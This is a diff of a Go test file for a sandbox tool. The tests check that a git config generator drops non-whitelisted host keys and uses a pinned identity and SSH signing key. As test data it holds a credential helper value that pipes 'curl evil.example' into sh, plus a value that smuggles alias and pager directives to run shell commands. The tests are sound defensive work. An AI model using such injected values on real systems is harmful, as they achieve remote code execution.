@@ -67,7 +67,7 @@ func TestGitConfigFromCarriesOnlyWhitelistedKeys(t *testing.T) {
 		"credential.helper":  "!curl evil.example | sh",
 		"core.pager":         "less",
 	}
-	out := string(GitConfigFrom(v, nil))
+	out := string(GitConfigFrom(v, nil, "/home/u"))
 	for _, want := range []string{"Some One", "some@example.com", "main"} {
 		if !strings.Contains(out, want) {
 			t.Errorf("generated config is missing %q:\n%s", want, out)
@@ -92,7 +92,7 @@ func TestNoExtractedValueCanAuthorADirective(t *testing.T) {
 		t.Run(key, func(t *testing.T) {
 			out := string(GitConfigFrom(GitValues{
 				key: "benign\n[alias]\n\tanything = !touch /tmp/PWNED\n[core]\n\tpager = !cmd",
-			}, nil))
+			}, nil, "/home/u"))
 			for _, forbidden := range []string{"[alias]", "anything", "pager", "!touch", "!cmd"} {
 				if strings.Contains(directives(out), forbidden) {
 					t.Errorf("a value authored %q in the generated config:\n%s", forbidden, out)
@@ -110,7 +110,7 @@ func TestABenignValueStillSurvives(t *testing.T) {
 		"user.name":          "Some One-Two Jr.",
 		"user.email":         "some.one+tag@example.com",
 		"init.defaultbranch": "release/main",
-	}, nil))
+	}, nil, "/home/u"))
 	for _, want := range []string{"Some One-Two Jr.", "some.one+tag@example.com", "release/main"} {
 		if !strings.Contains(out, want) {
 			t.Errorf("an ordinary value was dropped: %q\n%s", want, out)
@@ -124,12 +124,75 @@ func TestIdentityOverridesExtractedValues(t *testing.T) {
 	// the file the account commits under.
 	v := GitValues{"user.name": "Host Name", "user.email": "host@example.com"}
 	id := &Identity{SSHMode: SSHAgentProxy, GitName: "Pinned Name", GitEmail: "pinned@example.com"}
-	out := string(GitConfigFrom(v, id))
+	out := string(GitConfigFrom(v, id, "/home/u"))
 	if !strings.Contains(out, "Pinned Name") || !strings.Contains(out, "pinned@example.com") {
 		t.Fatalf("the pinned identity did not win:\n%s", out)
 	}
 	if strings.Contains(out, "host@example.com") || strings.Contains(out, "Host Name") {
 		t.Errorf("an extracted value survived beside the pin:\n%s", out)
+	}
+}
+
+// A pinned signing_key AUTHORS the three signing directives — user.signingkey
+// naming the staged guest path, gpg.format = ssh, commit.gpgsign = true —
+// never carries them from the host. See gitextract.go's GitKeyWhitelist
+// comment for why authoring beats extraction here specifically.
+func TestGitConfigFromAuthorsSigningDirectivesFromThePin(t *testing.T) {
+	id := &Identity{SSHMode: SSHAgentProxy, SigningKey: "~/.ssh/id_ed25519_signing.pub"}
+	out := string(GitConfigFrom(nil, id, "/home/u"))
+
+	want := "/home/u/" + SigningKeyGuest
+	if !strings.Contains(out, `signingkey = "`+want+`"`) {
+		t.Errorf("generated config has no signingkey directive naming the staged absolute "+
+			"guest path %q:\n%s", want, out)
+	}
+	if !strings.Contains(directives(out), "format = ssh") {
+		t.Errorf("generated config does not set gpg.format = ssh:\n%s", out)
+	}
+	if !strings.Contains(directives(out), "gpgsign = true") {
+		t.Errorf("generated config does not set commit.gpgsign = true:\n%s", out)
+	}
+}
+
+// The negative that makes the positive above believable: a host git config
+// carrying all four signing-related keys — a developer who already has SSH
+// commit signing set up locally has exactly this — must contribute NONE of
+// its own values to the generated file. None of the four is in
+// GitKeyWhitelist, and a carried user.signingkey would in any case name a
+// HOST path that does not resolve inside the sandbox.
+func TestGitConfigFromNeverCarriesSigningKeysFromTheHost(t *testing.T) {
+	v := GitValues{
+		"user.name":                  "Some One",
+		"user.signingkey":            "/home/attacker/.ssh/host_signing_key.pub",
+		"gpg.format":                 "openpgp",
+		"commit.gpgsign":             "false",
+		"gpg.ssh.allowedsignersfile": "/home/attacker/.ssh/allowed_signers",
+	}
+	id := &Identity{SSHMode: SSHAgentProxy, SigningKey: "~/.ssh/id_ed25519_signing.pub"}
+	out := string(GitConfigFrom(v, id, "/home/u"))
+
+	for _, hostValue := range []string{
+		"/home/attacker/.ssh/host_signing_key.pub",
+		"openpgp",
+		"gpg.ssh.allowedsignersfile",
+		"/home/attacker/.ssh/allowed_signers",
+	} {
+		if strings.Contains(out, hostValue) {
+			t.Errorf("a host git-config value reached the generated file: %q\n%s", hostValue, out)
+		}
+	}
+	// The host set commit.gpgsign = false; snug always authors true once a
+	// signing key is pinned, never the host's off switch — checked against
+	// the authored value rather than searching for "false", which is too
+	// generic a string to assert absent.
+	if !strings.Contains(directives(out), "gpgsign = true") {
+		t.Errorf("commit.gpgsign is not authored true despite a pinned signing key:\n%s", out)
+	}
+	if !strings.Contains(out, "/home/u/"+SigningKeyGuest) {
+		t.Errorf("generated config does not author the staged guest signingkey path:\n%s", out)
+	}
+	if !strings.Contains(directives(out), "format = ssh") {
+		t.Errorf("generated config does not author gpg.format = ssh:\n%s", out)
 	}
 }
 
